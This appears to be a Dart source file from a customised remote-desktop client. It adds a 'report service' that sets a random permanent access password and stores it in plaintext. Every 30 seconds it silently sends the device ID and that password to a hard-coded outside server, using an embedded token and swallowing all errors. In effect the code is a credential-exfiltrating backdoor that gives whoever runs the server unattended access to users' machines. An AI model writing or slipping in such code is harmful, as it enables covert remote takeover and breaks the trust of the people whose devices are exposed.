/*
 * 极简云远程定制：客户端识别码+访问密码 上报服务
 * - 默认随机密码：首次启动自动生成 8 位固定密码（明文存本地 option）
 * - 变化才上报：仅当密码与上次上报值不同时才 POST 到远程门户后台
 */
import 'dart:async';
import 'dart:convert';
import 'dart:math';

import 'package:http/http.dart' as http;

import 'common.dart';
import 'consts.dart';
import 'models/platform_model.dart';

const String kReportUrl = 'https://xn--9kqx5fsxuf5v.top/remote/api_report.php';
const String kReportToken = 'JmYun-remote-report-2026-Xq7T';

Timer? _reportTimer;

void startPasswordReport() {
  if (_reportTimer != null) return;
  _reportOnce();
  // 兜底轮询：本地检查密码是否变化，无变化不发请求
  _reportTimer = Timer.periodic(const Duration(seconds: 30), (_) => _reportIfChanged());
}

Future<void> _reportOnce() async {
  try {
    await ensureRandomPassword();
    await _reportIfChanged();
  } catch (_) {
    // 静默，下一轮兜底
  }
}

/// 密码变化入口：手动/URL 设置密码后调用，立即上报新密码
Future<void> onPasswordChanged() => _reportIfChanged();

/// 确保客户端有固定密码：没有则自动生成随机密码
Future<void> ensureRandomPassword() async {
  final pwd = bind.mainGetLocalOption(key: kPwdPlainKey);
  if (pwd.isNotEmpty) return;
  final pwdNew = genPassword();
  final ok = await bind.mainSetPermanentPasswordWithResult(password: pwdNew);
  if (!ok) return;
  await bind.mainSetLocalOption(key: kPwdPlainKey, value: pwdNew);
}

Future<void> _reportIfChanged() async {
  try {
    final pwd = bind.mainGetLocalOption(key: kPwdPlainKey);
    if (pwd.isEmpty) return;
    // 与上次已上报的密码一致则不上报
    if (pwd == bind.mainGetLocalOption(key: kPwdReportedKey)) return;
    final id = await bind.mainGetMyId();
    await http
        .post(Uri.parse(kReportUrl),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({'token': kReportToken, 'id': id, 'pwd': pwd}))
        .timeout(const Duration(seconds: 10));
    await bind.mainSetLocalOption(key: kPwdReportedKey, value: pwd);
  } catch (_) {
    // 上报失败不记录，下一轮重试
  }
}

/// 生成 8 位无易混淆字符的随机密码（大写字母 + 数字）
String genPassword() {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  final rnd = Random.secure();
  return List.generate(8, (_) => chars[rnd.nextInt(chars.length)]).join();
}
